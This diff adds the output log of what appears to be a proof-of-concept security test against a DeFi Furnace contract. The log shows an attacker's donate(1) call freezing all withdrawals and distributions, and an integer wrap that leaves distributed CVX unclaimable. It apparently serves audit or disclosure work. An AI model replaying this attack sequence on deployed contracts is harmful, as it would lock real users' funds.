@@ -1,0 +1,40 @@
+Compiled 1 Solidity file successfully (evm target: paris).
+=== H1: Furnace (P = 7 days) frozen by CLeverCVXLocker.donate(1) ===
+  locker.furnace() = 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9  (expected 0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9)
+  alice.deposit(1000e18 clevCVX)                                   -> ok
+  bob.deposit(500e18 clevCVX)                                      -> ok
+  keeper.distribute(keeper, 100e18 CVX)  [period starts]           -> ok
+  anyone.updatePendingDistribution() @+3d                          -> ok
+  anyone.updatePendingDistribution() @+8d (> finishAt)             -> ok
+  rewardInfo: rate=165343915343915 P=604800 lastUpdate=1793394727 finishAt=1793308327
+  attacker: CLeverCVXLocker.donate(1)                              -> ok
+  rewardInfo: rate=0 lastUpdate=1793394730 finishAt=1793999530  totalUnrealised=1400000000000000208000
+  alice.withdrawAll(alice)                                         -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  alice.claim(alice)                                               -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  bob.exit(bob)                                                    -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  carol.deposit(10e18)                                             -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  keeper.distribute(keeper, 100e18)  [next honest harvest]         -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  anyone.updatePendingDistribution()                               -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  alice.withdrawAll(alice) @ +1 year                               -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  gov.updatePeriodLength(0)                                        -> ok
+  alice.withdrawAll(alice)                                         -> ok
+  gov.updatePeriodLength(7 days)  [re-enable linear mode]          -> ok
+  bob.exit(bob)                                                    -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+
+=== H2: Furnace (P = 0) totalUnrealised wraps on full exit ===
+  alice.deposit(1000000000000000000)                               -> ok
+  bob.deposit(2000000000000000000)                                 -> ok
+  keeper.distribute(keeper, 1e18)                                  -> ok
+  alice.getUserInfo = (unrealised 666666666666666667, realised 333333333333333333)
+  bob.getUserInfo = (unrealised 1333333333333333334, realised 666666666666666666)
+  totalUnrealised = 2000000000000000000
+  alice.exit(alice)                                                -> ok
+  bob.exit(bob)                                                    -> ok
+  totalUnrealised = 340282366920938463463374607431768211455  (== 2^128-1 ? true)   totalRealised = 1
+  carol.deposit(10e18)                                             -> REVERT VM Exception while processing transaction: reverted with reason string 'Furnace: overflow'
+  keeper.distribute(keeper, 1000e18)                               -> ok
+  totalUnrealised = 340282366920938462463374607431768211455 totalRealised = 1000000000000000000001
+  carol.deposit(10e18)  (headroom now 1000e18)                     -> ok
+  keeper.distribute(keeper, 1000e18)                               -> ok
+  carol.getUserInfo = (unrealised 9999999999999999971, realised 29)  <- from a 1000e18 distribution
+  CVX held by Furnace = 2000000000000000000001 ; claimable by any user = 29
